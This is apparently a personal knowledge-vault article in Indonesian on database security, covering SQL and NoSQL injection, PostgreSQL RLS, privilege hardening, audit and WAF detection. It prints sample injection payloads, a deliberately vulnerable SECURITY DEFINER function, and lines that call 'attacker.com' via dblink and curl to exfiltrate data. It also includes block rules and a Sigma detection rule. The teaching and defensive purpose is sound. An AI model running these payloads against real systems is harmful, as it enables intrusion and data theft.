---
title: "Database Security — SQL & NoSQL Injection Defense, RLS, dan Secure Schema Patterns"
tags:
  - database-security
  - sql-injection
  - nosql-injection
  - postgresql
  - rls
  - owasp
  - library
aliases:
  - "database-security-deepdive"
  - "sql-nosql-injection-defense"
  - "postgres-rls"
created: "2026-07-19"
updated: "2026-07-19"
status: active
cssclasses:
  - wide-table
---

# 🛡️ Database Security — SQL & NoSQL Injection Defense, RLS, dan Secure Schema Patterns

> **Filosofi:** Database security bukan cuma parameterized query. Layer defense harus dari schema design (RLS, column-level grants), connection security (TLS, least-privilege user), injection defense (prepared statements, input sanitization), dan audit trail (pgaudit, MongoDB audit log). Satu celah di layer mana pun bisa cascade ke full data breach.

> [!info] Posisi di Vault
> Terhubung dengan [[database-internals-indexing-mvcc]] (storage engine dan query execution), [[postgresql-admin-backup]] (backup strategy + restore), [[api-security-deep-dive]] (input validation layer), [[waf-reverse-proxy-deepdive]] (WAF SQLi detection via libinjection), dan [[container-kubernetes-security-deepdive]] (database container hardening).

---

## Daftar Isi

- [[#1. SQL Injection — Classic to Advanced]]
- [[#2. NoSQL Injection — MongoDB, Elasticsearch, Redis]]
- [[#3. PostgreSQL Row-Level Security (RLS)]]
- [[#4. Column-Level Grants & Privilege Hardening]]
- [[#5. Connection Security — TLS, Certificates, Least-Privilege User]]
- [[#6. Secure Schema Design Patterns]]
- [[#7. Database Firewall — ProxySQL, pgBouncer Filtering]]
- [[#8. Audit & Detection — pgaudit, MongoDB Audit, Sigma Rules]]
- [[#9. WAF SQLi Detection — libinjection + CRS Rules]]
- [[#10. Pentesting Checklist]]

---

## 1. SQL Injection — Classic to Advanced

### 1.1 Classic Union-based SQLi

```sql
-- Input: ' UNION SELECT username, password FROM users --
SELECT id, name, email FROM users WHERE id = '' UNION SELECT username, password FROM users --'
```

### 1.2 Blind SQLi — Boolean-based

```sql
-- Input: ' OR 1=1 --  (true) vs ' AND 1=2 -- (false)
-- Attacker bedain response untuk infer data karakter demi karakter
GET /api/products?id=1 AND SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1)='a'
```

### 1.3 Time-based Blind SQLi

```sql
-- Input: '; IF (SELECT COUNT(*) FROM users) > 100 WAITFOR DELAY '0:0:5' --
-- Attacker lihat response time → tahu query result
```

### 1.4 Second-Order SQLi

Attacker inject data ke database (via register form). Data disimpan bersih (no immediate exploit). Tapi saat aplikasi lain membaca data itu dan concatenate ke query baru → triggered.

```
Step 1: Register username: "admin' --"
Step 2: Admin melihat user list
Step 3: Query: SELECT * FROM users WHERE username = 'admin' --'
        → Comment out sisanya → logic bypass
```

### 1.5 Out-of-Band SQLi (OOB)

```sql
-- PostgreSQL: dblink extension untuk exfiltrate via DNS/HTTP
SELECT dblink_connect('host=attacker.com user=exfil password=exfil dbname=postgres');
SELECT dblink_exec('SELECT current_database()');
```

### 1.6 Defense Per Layer

| Layer | Teknik | Implementasi |
|-------|--------|-------------|
| **Application** | Parameterized query / prepared statement | `cursor.execute("SELECT * FROM users WHERE id = %s", (user_id,))` |
| **ORM** | Query builder — never raw concatenation | Django: `User.objects.filter(id=user_id)`, Hibernate: `entityManager.createQuery("FROM User WHERE id = :id").setParameter("id", id)` |
| **Database** | Input type enforcement | PostgreSQL: `id::integer` cast, `pg_input_is_valid()` |
| **WAF** | libinjection fingerprint | CRS rules 942100, 942110, 942120 — detect SQLi tokens |
| **Monitoring** | Slow query log + anomaly detection | pg_stat_statements + `auto_explain` untuk query di luar pola normal |

### 1.7 Prepared Statement — Why It Works

```
❌ String concatenation:
   query = "SELECT * FROM users WHERE id = " + user_input
   → Input: "1 OR 1=1" → SELECT * FROM users WHERE id = 1 OR 1=1

✅ Prepared Statement:
   cursor.execute("SELECT * FROM users WHERE id = %s", (user_input,))
   → PostgreSQL parse: $1 placeholder, lalu bind value "1 OR 1=1" sebagai STRING
   → SELECT * FROM users WHERE id = '1 OR 1=1'  ← literal string, bukan SQL
```

---

## 2. NoSQL Injection — MongoDB, Elasticsearch, Redis

### 2.1 MongoDB — Operator Injection

```javascript
// ❌ Vulnerable — langsung concat body ke query
app.post('/api/login', async (req, res) => {
  const user = await db.collection('users').findOne({
    username: req.body.username,
    password: req.body.password
  })
})

// 🔥 Payload: {"username": "admin", "password": {"$ne": ""}}
// Query jadi: findOne({username: "admin", password: {"$ne": ""}})
// → password TIDAK sama dengan "" → SELALU TRUE → login sukses!
```

**Semua operator MongoDB yang bisa di-inject:**
| Operator | Efek | Payload |
|----------|------|---------|
| `$ne` | Not equal — bypass equality check | `{"password": {"$ne": ""}}` |
| `$gt` | Greater than — bypass numeric limit | `{"age": {"$gt": 18}}` |
| `$regex` | Regex match — blind extraction | `{"token": {"$regex": "^a"}}` |
| `$where` | JavaScript execution — RCE | `{"$where": "sleep(5000) || true"}` |
| `$exists` | Field existence check | `{"role": {"$exists": true}}` |

### 2.2 MongoDB Defense

```javascript
// ✅ Type-check semua input sebelum query
const Joi = require('joi')

const schema = Joi.object({
  username: Joi.string().alphanum().min(3).max(30).required(),
  password: Joi.string().min(8).required()
})

const { error, value } = schema.validate(req.body)
if (error) return res.status(400).json({ error: error.message })

// ✅ Sanitasi operator — strip $ prefix dari keys
function sanitize(obj) {
  if (typeof obj !== 'object' || obj === null) return obj
  for (let key of Object.keys(obj)) {
    if (key.startsWith('$')) delete obj[key]
    else sanitize(obj[key])
  }
  return obj
}

const clean = sanitize(req.body)
const user = await db.collection('users').findOne(clean)
```

### 2.3 Elasticsearch — Script Injection

```json
// ❌ Painless scripting tanpa sandbox
POST /_search
{
  "query": {
    "script": {
      "script": "doc['balance'].value + params.increment",
      "params": { "increment": "Runtime.getRuntime().exec('curl attacker.com')" }
    }
  }
}
```

**Defense:** Disable dynamic scripting, enable sandbox, whitelist script sources.

### 2.4 Redis — Lua Sandbox Escape

```
EVAL "return redis.call('set', KEYS[1], ARGV[1])" 1 user:session:admin "{\"role\":\"admin\"}"
```

**Defense:** Redis ACL (Redis 6+), disable EVAL for non-admin users.

---

## 3. PostgreSQL Row-Level Security (RLS)

### 3.1 Konsep

RLS = policy di level row yang auto-filter query berdasarkan user context. Bukan application logic — database yang enforce.

```sql
-- Enable RLS di tabel
ALTER TABLE projects ENABLE ROW LEVEL SECURITY;

-- Policy: user hanya lihat project miliknya
CREATE POLICY project_owner_policy ON projects
  FOR ALL
  TO authenticated_user
  USING (owner_id = current_setting('app.current_user_id')::integer);

-- Application set user context tiap session
SET app.current_user_id = '42';
```

**Setelah RLS aktif:** `SELECT * FROM projects` hanya return rows where `owner_id = 42` — **meskipun query gak ada WHERE clause.** Database menolak row yang gak match.

### 3.2 Multi-Tenant RLS Pattern

```sql
-- Schema: satu database, multi tenant
CREATE TABLE tenant_data (
  id SERIAL PRIMARY KEY,
  tenant_id INTEGER NOT NULL,
  content TEXT
);

ALTER TABLE tenant_data ENABLE ROW LEVEL SECURITY;

CREATE POLICY tenant_isolation ON tenant_data
  USING (tenant_id = current_setting('app.tenant_id')::integer);

-- App set tenant context:
SET app.tenant_id = '5';
```

**Keuntungan:** Satu query `SELECT * FROM tenant_data` gak akan pernah leak data antar tenant — database enforce isolation, bukan application.

### 3.3 RLS + Column-Level Grants

```sql
-- User biasa: lihat semua kolom kecuali salary
GRANT SELECT (id, name, email, department) ON employees TO regular_user;

-- Manager: lihat salary untuk departemennya sendiri
CREATE POLICY manager_salary_policy ON employees
  FOR SELECT
  TO manager_role
  USING (department_id = current_setting('app.user_department')::integer);
```

### 3.4 RLS Bypass Check

```sql
-- Cek apakah RLS benar-benar enforce:
SELECT * FROM projects;  -- harusnya hanya return rows untuk current user

-- Tes bypass:
SET app.current_user_id = '99';  -- impersonate user lain
SELECT * FROM projects;  -- harusnya return rows untuk user 99

-- Tes superuser bypass:
SET ROLE postgres;
SELECT * FROM projects;  -- superuser bypass RLS (expected)
```

---

## 4. Column-Level Grants & Privilege Hardening

### 4.1 PostgreSQL Column Privileges

```sql
-- Principle: Least privilege per column
-- User API hanya bisa SELECT id, name, email — tidak bisa lihat password_hash
GRANT SELECT (id, username, email, created_at) ON users TO api_user;

-- User admin bisa SELECT semua kolom
GRANT SELECT ON users TO admin_user;

-- User registration service bisa INSERT tapi tidak bisa UPDATE/DELETE
GRANT INSERT (username, email, password_hash) ON users TO registration_service;

-- Cek privilege saat ini:
SELECT column_name, privilege_type
FROM information_schema.column_privileges
WHERE table_name = 'users';
```

### 4.2 Schema-Level Hardening

```sql
-- Public schema: revoke default CREATE permission
REVOKE CREATE ON SCHEMA public FROM PUBLIC;

-- Search path security:
ALTER DATABASE mydb SET search_path TO "$user", public, pg_catalog;

-- Prevent untrusted extensions:
ALTER SYSTEM SET shared_preload_libraries = 'pg_stat_statements, auto_explain';
-- (No dblink, postgres_fdw kecuali disetujui)
```

### 4.3 Function Security

```sql
-- SECURITY DEFINER vs SECURITY INVOKER
-- ❌ Bahaya: SECURITY DEFINER dengan function yang call user input
CREATE FUNCTION dangerous_search(query TEXT)
RETURNS SETOF users
LANGUAGE plpgsql
SECURITY DEFINER  -- jalan sebagai owner (mungkin superuser!)
AS $$
BEGIN
  RETURN QUERY EXECUTE 'SELECT * FROM users WHERE name ILIKE ''%' || query || '%''';
  --                   ^^^^^^^^^ SQL injection + superuser privilege = RCE
END;
$$;

-- ✅ SECURITY INVOKER + parameterized
CREATE FUNCTION safe_search(query TEXT)
RETURNS SETOF users
LANGUAGE plpgsql
SECURITY INVOKER  -- jalan sebagai user yang manggil
AS $$
BEGIN
  RETURN QUERY EXECUTE 'SELECT * FROM users WHERE name ILIKE $1' USING '%' || query || '%';
END;
$$;
```

---

## 5. Connection Security — TLS, Least-Privilege User

### 5.1 PostgreSQL TLS Setup

```bash
# server.crt + server.key dari Let's Encrypt atau self-signed CA
# postgresql.conf:
ssl = on
ssl_cert_file = '/etc/ssl/certs/server.crt'
ssl_key_file = '/etc/ssl/private/server.key'
ssl_ca_file = '/etc/ssl/certs/ca.crt'    # untuk client certificate verification

# pg_hba.conf — enforce TLS:
hostssl all all 0.0.0.0/0 scram-sha-256 clientcert=verify-full
```

### 5.2 Least-Privilege Database User

```
CREATE ROLE api_readonly WITH LOGIN PASSWORD 'strong_pass';
GRANT CONNECT ON DATABASE mydb TO api_readonly;
GRANT USAGE ON SCHEMA public TO api_readonly;
GRANT SELECT ON ALL TABLES IN SCHEMA public TO api_readonly;
ALTER DEFAULT PRIVILEGES IN SCHEMA public GRANT SELECT ON TABLES TO api_readonly;
-- api_readonly: hanya SELECT, tidak bisa INSERT/UPDATE/DELETE/DDL
```

### 5.3 Connection String Security

```
# ❌ JANGAN: password di environment variable tanpa quotes
export DATABASE_URL=postgresql://user:P@ssword!with!special@host:5432/db
#                                             ^ bash history expansion!

# ✅ Gunakan .env dengan quotes:
DATABASE_URL="postgresql://user:P%40ssword%21with%21special@host:5432/db"
# URL-encode special chars: ! → %21, @ → %40, # → %23

# ✅ Atau gunakan pgpass file:
echo "host:port:database:user:password" > ~/.pgpass
chmod 0600 ~/.pgpass
```

---

## 6. Secure Schema Design Patterns

### 6.1 Immutable Audit Trail

```sql
CREATE TABLE audit_log (
  id BIGSERIAL PRIMARY KEY,
  table_name TEXT NOT NULL,
  record_id BIGINT NOT NULL,
  action TEXT NOT NULL,  -- INSERT, UPDATE, DELETE
  old_data JSONB,
  new_data JSONB,
  changed_by TEXT NOT NULL,
  changed_at TIMESTAMPTZ DEFAULT now()
);

-- Trigger function:
CREATE OR REPLACE FUNCTION audit_trigger()
RETURNS TRIGGER AS $$
BEGIN
  IF TG_OP = 'INSERT' THEN
    INSERT INTO audit_log (table_name, record_id, action, new_data, changed_by)
    VALUES (TG_TABLE_NAME, NEW.id, 'INSERT', to_jsonb(NEW), current_user);
  ELSIF TG_OP = 'UPDATE' THEN
    INSERT INTO audit_log (table_name, record_id, action, old_data, new_data, changed_by)
    VALUES (TG_TABLE_NAME, NEW.id, 'UPDATE', to_jsonb(OLD), to_jsonb(NEW), current_user);
  ELSIF TG_OP = 'DELETE' THEN
    INSERT INTO audit_log (table_name, record_id, action, old_data, changed_by)
    VALUES (TG_TABLE_NAME, OLD.id, 'DELETE', to_jsonb(OLD), current_user);
  END IF;
  RETURN NULL;
END;
$$ LANGUAGE plpgsql;

-- Pasang trigger di semua tabel sensitif:
CREATE TRIGGER audit_users AFTER INSERT OR UPDATE OR DELETE ON users
  FOR EACH ROW EXECUTE FUNCTION audit_trigger();
```

### 6.2 Encryption at Rest — Column-Level

```sql
-- pgcrypto extension:
CREATE EXTENSION pgcrypto;

-- Encrypt column:
UPDATE users SET ssn_encrypted = pgp_sym_encrypt(ssn, 'encryption_key')
WHERE ssn IS NOT NULL;

ALTER TABLE users DROP COLUMN ssn;
ALTER TABLE users RENAME COLUMN ssn_encrypted TO ssn;

-- Decrypt di application, bukan di query:
SELECT pgp_sym_decrypt(ssn, 'encryption_key') FROM users WHERE id = 42;
```

### 6.3 Enum vs Lookup Table for Roles

```sql
-- ✅ ENUM type — database enforce valid values
CREATE TYPE user_role AS ENUM ('user', 'moderator', 'admin');

CREATE TABLE users (
  id SERIAL PRIMARY KEY,
  role user_role NOT NULL DEFAULT 'user'
);

-- ❌ String role tanpa constraint
-- role TEXT → bisa diisi 'superadmin', 'owner', value arbitrary
```

---

## 7. Database Firewall — ProxySQL & Connection Pooler Filtering

### 7.1 pgBouncer + Query Filtering

```ini
# pgBouncer sebagai middleware antara app → PostgreSQL
[pgbouncer]
listen_addr = 127.0.0.1
listen_port = 6432
auth_type = scram-sha-256

[databases]
mydb = host=127.0.0.1 port=5432 dbname=mydb

# Query timeout — prevent long-running malicious queries
query_timeout = 30

# Max connections per user — prevent connection exhaustion
max_user_connections = 50
```

### 7.2 ProxySQL — MySQL Query Firewall

```sql
-- ProxySQL query rules untuk block SQLi patterns
INSERT INTO mysql_query_rules (rule_id, active, match_pattern, action)
VALUES
  (1, 1, 'UNION.*SELECT', 'block'),
  (2, 1, 'INTO OUTFILE', 'block'),
  (3, 1, 'INTO DUMPFILE', 'block'),
  (4, 1, 'WAITFOR DELAY', 'block'),
  (5, 1, 'information_schema', 'block');
```

---

## 8. Audit & Detection

### 8.1 PostgreSQL — pgaudit Extension

```sql
CREATE EXTENSION pgaudit;

-- Audit semua DDL dan DML:
SET pgaudit.log = 'write, ddl';
SET pgaudit.log_level = 'warning';

-- Log sample:
-- AUDIT: SESSION,1,1,DDL,CREATE TABLE,,,CREATE TABLE users (id SERIAL),<not logged>
-- AUDIT: SESSION,2,1,WRITE,INSERT,,,INSERT INTO users (name, email) VALUES ('attacker','x@y.com'),<not logged>
```

### 8.2 Sigma Rule — PostgreSQL Suspicious Activity

```yaml
title: "PostgreSQL dblink Extension Used for Data Exfiltration"
id: 8f2c1e4a-3d8c-4p6e-9f2a-1d5e7c8b0a3f
status: experimental
logsource:
  product: postgresql
  service: pgaudit
detection:
  selection:
    command: SELECT
    statement|contains:
      - 'dblink_connect'
      - 'dblink_exec'
      - 'dblink_send_query'
  condition: selection
level: high
```

### 8.3 MongoDB Audit Log

```yaml
# mongod.conf
auditLog:
  destination: file
  format: JSON
  path: /var/log/mongodb/audit.log
  filter: |
    {
      atype: { $in: ["authenticate", "createCollection", "dropCollection", "createIndex", "dropIndex"] },
      users: [],
      "$or": [
        { param: { $regex: /^(?!regular_operation)/ } }
      ]
    }
```

---

## 9. WAF SQLi Detection — libinjection + CRS Rules

### 9.1 CRS Ruleset (ModSecurity / Coraza)

| Rule ID | Phase | Deskripsi |
|---------|-------|-----------|
| **942100** | 2 | SQLi basic — `' OR 1=1 --` |
| **942110** | 2 | SQLi advanced — blind/time-based |
| **942120** | 2 | SQLi — UNION SELECT |
| **942150** | 2 | SQLi — INTO OUTFILE / DUMPFILE |
| **942200** | 2 | SQLi — WAITFOR DELAY |
| **942370** | 2 | SQLi — classic `' OR '1'='1` |
| **942430** | 2 | SQLi — restricted characters |

### 9.2 Rust-based WAF: libinjection in jarsWAF

```rust
// jarsWAF SQLi detection via libinjection crate
use libinjection::{sqli, Libinjection};

fn detect_sqli(input: &str) -> bool {
    let state = Libinjection::new();
    let result = state.sqli(input);
    
    if result.is_sqli() {
        log::warn!("SQLi detected in input: fingerprint={:?}", result.fingerprint);
        true
    } else {
        false
    }
}
```

---

## 10. Pentesting Checklist (Red Team)

```
Database Security Audit:
☐ Cek prepared statement usage: grep string concatenation di codebase
☐ Uji SQLi di semua endpoint dengan parameter: id, search, filter, sort, offset
☐ Blind SQLi: test waktu response dengan pg_sleep(5)
☐ Second-order SQLi: inject di register form → trigger di admin view
☐ NoSQLi: MongoDB $ne/$gt/$regex operator injection
☐ Test RLS: SET app.current_user_id ke id user lain, query SELECT * tanpa WHERE
☐ Check column grants: apa api_user bisa SELECT password_hash?
☐ Check pg_hba.conf: hostssl wajib untuk remote connections?
☐ Test dblink: apakah extension terinstall? SELECT dblink_connect(...)
☐ Audit trail: apakah semua DDL/DML logged via pgaudit?
☐ Connection pool: max connections reasonable? query timeout di-set?
☐ Backup security: apakah backup files (.dump, .sql) di-restrict permissions?
☐ Schema privilege: siapa yang punya CREATE ON SCHEMA public?
☐ Search path injection: SET search_path ke schema attacker → override function
```

---

## 🔗 Lihat Juga

- [[database-internals-indexing-mvcc]] — Storage engine, B-tree, MVCC fundamentals
- [[postgresql-admin-backup]] — Backup & restore strategy
- [[api-security-deep-dive]] — Input validation (SQLi/NoSQLi table)
- [[waf-reverse-proxy-deepdive]] — WAF SQLi/libinjection detection
- [[container-kubernetes-security-deepdive]] — Database container hardening
- [[comprehensive-threat-directory]] — Database threats taxonomy
- [[mass-assignment-broken-access-control-deepdive]] — Mass assignment & BAC

---

## Referensi

- OWASP. *SQL Injection Prevention Cheat Sheet*. https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html
- PostgreSQL. *Row Security Policies*. https://www.postgresql.org/docs/current/ddl-rowsecurity.html
- MongoDB. *Injection Prevention*. https://www.mongodb.com/docs/manual/faq/fundamentals/#how-does-mongodb-address-sql-or-query-injection
- pgaudit. *PostgreSQL Audit Extension*. https://github.com/pgaudit/pgaudit
- CRS. *SQL Injection Rules*. https://coreruleset.org/docs/rules/sqli/
- libinjection. *SQLi Detection Library*. https://github.com/libinjection/libinjection
- ProxySQL. *Query Firewall*. https://proxysql.com/documentation/query-rules/
- PostgreSQL. *TLS Configuration*. https://www.postgresql.org/docs/current/ssl-tcp.html
- CWE-89: Improper Neutralization of Special Elements used in an SQL Command. https://cwe.mitre.org/data/definitions/89.html
- CWE-943: Improper Neutralization of Special Elements in Data Query Logic (NoSQLi). https://cwe.mitre.org/data/definitions/943.html

---

*Dibuat: 19 Juli 2026 — Database security dari injection defense sampai RLS dan audit.*